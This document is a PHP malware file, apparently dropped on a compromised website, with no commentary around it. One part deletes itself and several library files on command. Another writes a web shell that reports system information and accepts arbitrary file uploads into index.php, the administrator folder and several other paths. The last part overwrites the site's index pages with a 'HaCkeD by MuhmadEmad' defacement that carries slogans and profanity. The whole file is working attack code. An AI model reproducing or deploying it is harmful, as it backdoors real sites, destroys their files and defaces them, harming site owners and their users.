<?php
if(isset($_GET["kurd"]))
	{
	$kurd =unlink(__FILE__);
@unlink("lib/functions.php");
@unlink("lib/file-uploader.php");
@unlink("controller.php");

	if ($kurd){ echo "Ok"; }else{ echo "error"; }}
?>
<?php
error_reporting(0);
echo "MuhmadEmad_or_SARA";
function Random($length = 7) {
    $pit = 'abcdefghijklmnopqrstuvwxyz';
    $rands = '';
    for ($i = 0; $i < $length; $i++) {
        $rands .= $pit[rand(0, strlen($pit) - 1)];
    }
    return $rands;
}
$ran = Random();
echo '<a hresdddf="'."$ran".'">';
$file1 = '<?php
error_reporting(0);
if(isset($_GET['."$ran".']))
	{
		echo"<font color=#FFFFFF>[uname]".php_uname()."[/uname]<br>";
		echo "<font color=#FFFFFF>[pwd]".getcwd()."[/pwd]<br>";
		print "\n";$disable_functions = @ini_get("disable_functions"); 
		echo "DisablePHP=".$disable_functions; print "<br>"; 
		echo"<form method=post enctype=multipart/form-data>"; 
		echo"<input type=file name=f><input name=v type=submit id=v value=up><br>"; 
		  if($_POST["v"]==up)
{ if(@copy($_FILES["f"]["tmp_name"],$_FILES["f"]["name"])){echo"<b>Ok</b>-->".$_FILES["f"]["name"];}else{echo"<b>error";}}  
{ if(@copy($_FILES["emad"]["tmp_name"],$_FILES["emad"]["name"])){echo"<b></b>-->".$_FILES["emad"]["name"];}else{echo"<b>";}}}
?>';
$r=fopen("foxcontact.php", "w"); fwrite($r,$file1); fclose($r);
$r=fopen("../index.php", "w"); fwrite($r,$file1); fclose($r);
$r=fopen("../../tmp/index.php", "w"); fwrite($r,$file1); fclose($r);
$r=fopen("../../bin/api.php", "w"); fwrite($r,$file1); fclose($r);
$r=fopen("../../images/index.php", "w"); fwrite($r,$file1); fclose($r);
$r=fopen("../../administrator/index3.php", "w"); fwrite($r,$file1); fclose($r);
$r=fopen("index.php", "w"); fwrite($r,$file1); fclose($r);
$file111 = '<html>
<head>
<title>
HaCkeD by MuhmadEmad
</title>
</head>
<body bgcolor=white>
<div style="text-align: center;"><font size="6" face="comic sans ms"><b>HaCkeD By  MuhmadEmad</b></font></div>
<div style="text-align: center;"><font size="5" face="comic sans ms"><b><br /></b></font></div>
<div style="text-align: center;"><font size="5" face="comic sans ms"><b>Long Live to peshmarga <br></b></font></div>
<div style="text-align: center;"><br /></div>
<p>
<div style="text-align: center;"><img src="http://zonehmirrors.org/defaced/2015/11/14/demilosightings.com/kurdistantour.net/uploads/statics_image/kurdistan_flag_waving.gif" width=25% hight=35% /></div>
<div style="text-align: center;"><br /></div>
<p>
<div style="text-align: center;"><font size="5" face="comic sans ms"><b>
<p>
KurDish HaCk3rS WaS Here
<p><br> kurdlinux007@gmail.com <br> FUCK ISIS ! 


</body>
</html>
';
$r=fopen("index.html", "w"); fwrite($r,$file111); fclose($r);
$r=fopen("../../krd.html", "w"); fwrite($r,$file111); fclose($r);


?>